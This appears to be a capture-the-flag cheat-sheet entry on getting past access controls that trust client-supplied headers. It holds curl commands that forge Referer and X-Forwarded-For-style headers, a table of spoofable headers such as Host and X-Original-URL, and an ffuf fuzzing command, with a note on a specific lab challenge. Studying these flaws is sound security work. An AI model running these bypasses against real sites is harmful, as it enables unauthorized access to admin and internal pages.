# Trusting client headers (Referer, X-Forwarded-For, User-Agent…) (CWE-293, CWE-290)

**Signs**: "staff only", "internal only", "you must come from…", "only from the office/localhost",
"only our app"; 403 without asking you to log in; hint "who sent you this way?".

## Referer gate
The page checks that `Referer` contains some path. Find the expected path (a "staff home" link, a
path *mentioned* in page text) and forge it:
```bash
curl -s -H "Referer: $T/wiki/staff-home" $T/wiki/internal/ops-runbook | grep -o 'flag{[^}]*}'
```

## IP allow-list via proxy headers
```bash
for h in X-Forwarded-For X-Real-IP X-Client-IP X-Originating-IP X-Remote-IP X-Remote-Addr \
         True-Client-IP CF-Connecting-IP Forwarded; do
  echo "$h: $(curl -s -o /dev/null -w '%{http_code}' -H "$h: 127.0.0.1" $T/admin)"; done
# Forwarded syntax:  -H 'Forwarded: for=127.0.0.1'
```
Values: `127.0.0.1`, `localhost`, `::1`, `10.0.0.1`, `192.168.0.1`, the server's own IP.

## Other headers
| Header | Try |
|---|---|
| `User-Agent` | `Googlebot`, the "official app" UA, `admin` |
| `Origin` | the site's own origin (CORS-based checks) |
| `Host` | `localhost`, internal names (may also change password-reset link host) |
| `X-Original-URL` / `X-Rewrite-URL` | `/admin` (proxy path override → 403 bypass) |
| `X-HTTP-Method-Override` | `PUT`/`DELETE` |

Fuzz all at once: `ffuf -u $T/admin -H 'FUZZ: 127.0.0.1' -w wordlists/web/ip-headers.txt -mc 200`.

Seen in: `auth2` (Harbor Wiki: `/wiki/internal/ops-runbook` only checks `Referer` contains
`/wiki/staff-home`; path appears in page text, not as a link).
